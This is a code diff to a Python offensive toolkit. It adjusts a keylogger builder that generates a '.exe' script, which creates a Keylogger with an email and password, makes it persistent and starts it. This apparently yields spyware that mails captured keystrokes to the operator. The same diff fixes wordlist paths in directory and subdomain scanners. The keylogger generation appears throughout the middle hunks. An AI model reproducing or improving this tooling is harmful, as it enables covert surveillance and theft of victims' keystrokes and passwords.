@@ -119,7 +119,7 @@ def is_valid_email(email):
     return re.match(r'^[^@]+@[^@]+\.[^@]+$', email)
 
 def is_valid_filename(filename):
-    return re.match(r'^[\w,\s-]+\.[A-Za-z]{1,5}$', filename)
+    return re.match(r'^[\w\- ]+$', filename)
 
 def making_keylogger():
     while True:
@@ -142,10 +142,12 @@ def making_keylogger():
         print("[!] Please enter a valid positive number.")
 
     while True:
-        file_name = input("[+] Enter name for the output file : ").strip()
+        file_name = input("[+] Enter name for the output file(.exe): ").strip()
         if is_valid_filename(file_name):
+            if not file_name.endswith(".exe"):
+                file_name += ".exe"
             break
-        print("[!] Invalid file name. Use a valid format like 'logger'.")
+        print("[!] Invalid file name. Use a valid format like 'logger'")
 
     create_keylogger_executable(file_name, time_interval, email, password)
     if platform.system().startswith("Windows"):
@@ -157,7 +159,7 @@ def making_keylogger():
 def create_keylogger_executable(file_name, interval, email, password):
     with open(file_name, "w+") as file:
         file.write("import keylogger\n")
-        file.write("zlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
+        file.write("zlogger = keylogger.Keylogger(" + str(interval) + ",'" + email + "','" + password + "')\n")
         file.write("zlogger.become_persistent()\n")
         file.write("zlogger.start()\n")
 
@@ -203,8 +205,8 @@ def finding_directory():
     #DEFAULT_WORDLIST = "/home/kali/Key-Logger/directory-list-2.3-medium.txt"
 
     if user_input == 'n':
-        if not is_valid_file(DEFAULT_WORDLIST):
-            print(f"[!] Default wordlist not found at {DEFAULT_WORDLIST}.")
+        if not is_valid_file(DEFAULT_WORDLIST_DIR):
+            print(f"[!] Default wordlist not found at {DEFAULT_WORDLIST_DIR}.")
             return
         Scan = DirectoryScanner(target_url, DEFAULT_WORDLIST_DIR, file_result)
         Scan.scan()
@@ -251,8 +253,8 @@ def finding_subs():
     #DEFAULT_WORDLIST = "/home/kali/Key-Logger/subdomain_wordlist.txt"
 
     if user_input == 'n':
-        if not is_valid_file(DEFAULT_WORDLIST):
-            print(f"[!] Default wordlist not found at {DEFAULT_WORDLIST}.")
+        if not is_valid_file(DEFAULT_WORDLIST_SUB):
+            print(f"[!] Default wordlist not found at {DEFAULT_WORDLIST_SUB}.")
             return
         Scan = SubdomainScanner(target_url, DEFAULT_WORDLIST_SUB, file_result)
         Scan.scan()
